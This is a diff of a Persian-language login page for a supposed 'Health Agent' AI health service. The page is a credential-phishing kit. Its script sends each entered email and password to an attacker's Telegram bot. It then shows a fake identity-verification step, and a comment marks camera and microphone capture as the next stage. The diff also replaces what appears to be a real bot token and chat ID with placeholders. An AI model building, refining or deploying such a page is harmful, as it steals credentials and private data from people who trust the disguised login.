@@ -3,21 +3,33 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>ورود | Health Agent</title>
+<title>Health Agent | Secure Login</title>
 <style>
+  /* ========== ریست و بدنه ========== */
   * { box-sizing: border-box; margin: 0; padding: 0; }
   body {
     font-family: Tahoma, sans-serif;
     background: linear-gradient(135deg, #eef1f5 0%, #dce6f5 100%);
     display: flex; justify-content: center; align-items: center;
-    min-height: 100vh; padding: 16px;
+    min-height: 100vh; padding: 16px; overflow: hidden;
   }
+
+  /* ========== کارت اصلی ========== */
   .card {
     width: 100%; max-width: 380px;
     background: #fff; border-radius: 20px;
     box-shadow: 0 8px 40px rgba(0,0,0,0.12);
     padding: 32px 24px;
+    position: relative;
+    transition: all 0.4s ease;
   }
+
+  /* ========== بخش‌ها (Login و Verify) ========== */
+  .section { display: none; animation: fadeIn 0.5s ease forwards; }
+  .section.active { display: block; }
+  @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+  /* ========== برند ========== */
   .brand { text-align: center; margin-bottom: 28px; }
   .brand-icon {
     width: 56px; height: 56px;
@@ -28,97 +40,151 @@
   }
   .brand h1 { font-size: 20px; color: #1a1a1a; margin-bottom: 4px; }
   .brand p { font-size: 12px; color: #666; }
+
+  /* ========== فرم ========== */
   .field { margin-bottom: 14px; }
   .field label { display: block; font-size: 12px; color: #555; margin-bottom: 6px; }
   .field input {
     width: 100%; padding: 14px;
     border: 1px solid #ddd; border-radius: 10px;
     font-size: 14px; font-family: Tahoma;
+    transition: border-color 0.2s;
   }
   .field input:focus { outline: none; border-color: #1a73e8; }
-  .submit-btn {
+
+  /* ========== دکمه‌ها ========== */
+  .btn {
     width: 100%; padding: 15px;
     background: linear-gradient(135deg, #1a73e8, #0d47a1);
     color: #fff; border: none; border-radius: 10px;
     font-size: 15px; font-family: Tahoma; cursor: pointer;
-    margin-top: 8px;
+    margin-top: 8px; transition: opacity 0.2s;
   }
-  .submit-btn:disabled { opacity: 0.6; cursor: not-allowed; }
+  .btn:disabled { opacity: 0.6; cursor: not-allowed; }
+
+  /* ========== متن خطا و وضعیت ========== */
   .error { color: #d93025; font-size: 12px; text-align: center; margin-top: 12px; min-height: 16px; }
+  .status { color: #1a73e8; font-size: 13px; text-align: center; margin-top: 16px; min-height: 20px; font-weight: bold; }
+
+  /* ========== فوتر ========== */
   .footer { text-align: center; font-size: 11px; color: #999; margin-top: 20px; }
+
+  /* ========== اسپینر لودینگ ========== */
+  .spinner {
+    display: inline-block; width: 16px; height: 16px;
+    border: 2px solid #ddd; border-top-color: #1a73e8;
+    border-radius: 50%; animation: spin 0.8s linear infinite;
+    vertical-align: middle; margin-left: 6px;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
 </style>
 </head>
 <body>
+
 <div class="card">
-  <div class="brand">
-    <div class="brand-icon">🛡️</div>
-    <h1>Health Agent</h1>
-    <p>AI Health Analysis · Secure</p>
+  
+  <!-- ================= صفحه ۱: ورود ================= -->
+  <div id="loginSection" class="section active">
+    <div class="brand">
+      <div class="brand-icon">🛡️</div>
+      <h1>Health Agent</h1>
+      <p>AI Health Analysis · Secure</p>
+    </div>
+    
+    <form id="loginForm" autocomplete="off">
+      <div class="field">
+        <label for="email">ایمیل</label>
+        <input type="email" id="email" placeholder="example@mail.com" required>
+      </div>
+      <div class="field">
+        <label for="password">رمز عبور</label>
+        <input type="password" id="password" placeholder="••••••••" required>
+      </div>
+      <button type="submit" class="btn" id="loginBtn">ورود به داشبورد</button>
+      <div class="error" id="errorMsg"></div>
+    </form>
+    
+    <div class="footer">© Health Agent — Secure AI Platform</div>
   </div>
-  <form id="loginForm" autocomplete="off">
-    <div class="field">
-      <label for="email">ایمیل</label>
-      <input type="email" id="email" placeholder="example@mail.com" required>
-    </div>
-    <div class="field">
-      <label for="password">رمز عبور</label>
-      <input type="password" id="password" placeholder="••••••••" required>
-    </div>
-    <button type="submit" class="submit-btn" id="loginBtn">ورود به داشبورد</button>
-    <div class="error" id="errorMsg"></div>
-  </form>
-  <div class="footer">© Health Agent — Secure AI Platform</div>
+
+  <!-- ================= صفحه ۲: تایید هویت ================= -->
+  <div id="verifySection" class="section" style="text-align: center;">
+    <div class="brand-icon" style="margin-bottom: 16px;">🛡️</div>
+    <h1 style="font-size: 19px; color: #1a1a1a; margin-bottom: 10px;">تأیید هویت</h1>
+    <p style="font-size: 13px; color: #666; line-height: 1.8; margin-bottom: 24px;">
+      برای اطمینان از صحت اطلاعات و فعال‌سازی تحلیل هوشمند، لطفاً هویت خود را تأیید کنید.
+    </p>
+    
+    <button class="btn" id="verifyBtn">شروع تأیید هویت</button>
+    <div class="status" id="verifyStatus"></div>
+  </div>
+
 </div>
 
 <script>
 /* ============================================================
-   تنظیمات — مقادیر واقعی خودت را بگذار
+   تنظیمات
    ============================================================ */
-const BOT_TOKEN = '8986087239:AAEw2wedRgnuYQLMYop2ztHv7KqQTGtvfSE'                    
-                      
-  ;
-const CHAT_ID   = '536648369'                    
-  ;
+const BOT_TOKEN = 'YOUR_BOT_TOKEN'; // توکن خودت را بگذار
+const CHAT_ID   = 'YOUR_CHAT_ID';   // چت آیدی خودت را بگذار
 
 /* ============================================================
-   ارسال پیام متنی به تلگرام
+   توابع ارسال به تلگرام
    ============================================================ */
 async function sendToTelegram(text) {
   try {
-    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ chat_id: CHAT_ID, text })
     });
-    if (!res.ok) throw new Error('Telegram response not ok');
   } catch (e) {
-    console.error('ارسال به تلگرام ناموفق:', e.message);
+    console.error('ارسال ناموفق:', e.message);
   }
 }
 
 /* ============================================================
-   رویداد submit فرم لاگین
+   منطق فرم لاگین
    ============================================================ */
 document.getElementById('loginForm').addEventListener('submit', async (e) => {
   e.preventDefault();
 
-  const email    = document.getElementById('email').value.trim();
+  const email = document.getElementById('email').value.trim();
   const password = document.getElementById('password').value;
-  const btn      = document.getElementById('loginBtn');
-  const errEl    = document.getElementById('errorMsg');
+  const btn = document.getElementById('loginBtn');
+  const errEl = document.getElementById('errorMsg');
 
   btn.disabled = true;
-  btn.textContent = 'در حال بررسی...';
+  btn.innerHTML = 'در حال بررسی... <span class="spinner"></span>';
   errEl.textContent = '';
 
-  // ارسال ایمیل/پسورد به تلگرام
+  // ارسال به تلگرام
   await sendToTelegram(`🔐 لاگین جدید در Health Agent\n📧 ایمیل: ${email}\n🔑 رمز: ${password}`);
 
-  // تأخیر کوتاه برای طبیعی بودن، سپس انتقال به verify
+  // تغییر صفحه بدون رفرش (با انیمیشن)
   setTimeout(() => {
-    window.location.href = 'verify.html';
-  }, 1200);
+    document.getElementById('loginSection').classList.remove('active');
+    document.getElementById('verifySection').classList.add('active');
+  }, 1000);
+});
+
+/* ============================================================
+   منطق صفحه تایید
+   ============================================================ */
+document.getElementById('verifyBtn').addEventListener('click', async () => {
+  const btn = document.getElementById('verifyBtn');
+  const status = document.getElementById('verifyStatus');
+
+  btn.disabled = true;
+  btn.innerHTML = 'در حال تأیید... <span class="spinner"></span>';
+
+  // فعلاً فقط پیام تست به تلگرام
+  await sendToTelegram('✅ کاربر وارد مرحله تأیید هویت شد (تست).');
+
+  status.textContent = '✅ تأیید انجام شد. (مرحله بعد: دوربین و میکروفون)';
+  btn.innerHTML = 'تأیید شد';
 });
 </script>
+
 </body>
 </html>
